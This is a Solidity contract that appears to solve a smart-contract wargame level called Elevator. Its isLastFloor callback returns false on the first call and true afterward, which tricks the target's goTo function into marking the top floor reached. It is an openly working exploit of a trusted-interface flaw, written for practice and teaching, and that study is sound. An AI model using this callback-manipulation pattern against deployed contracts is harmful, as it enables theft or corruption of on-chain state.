// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Elevator} from "../src/Elevator.sol";

contract ElevatorAttack {
    Elevator public elevator;
    uint256 public numberCalls;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint) external returns (bool) {
        if (numberCalls == 0) {
            numberCalls += 1;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        elevator.goTo(42);
    }
}
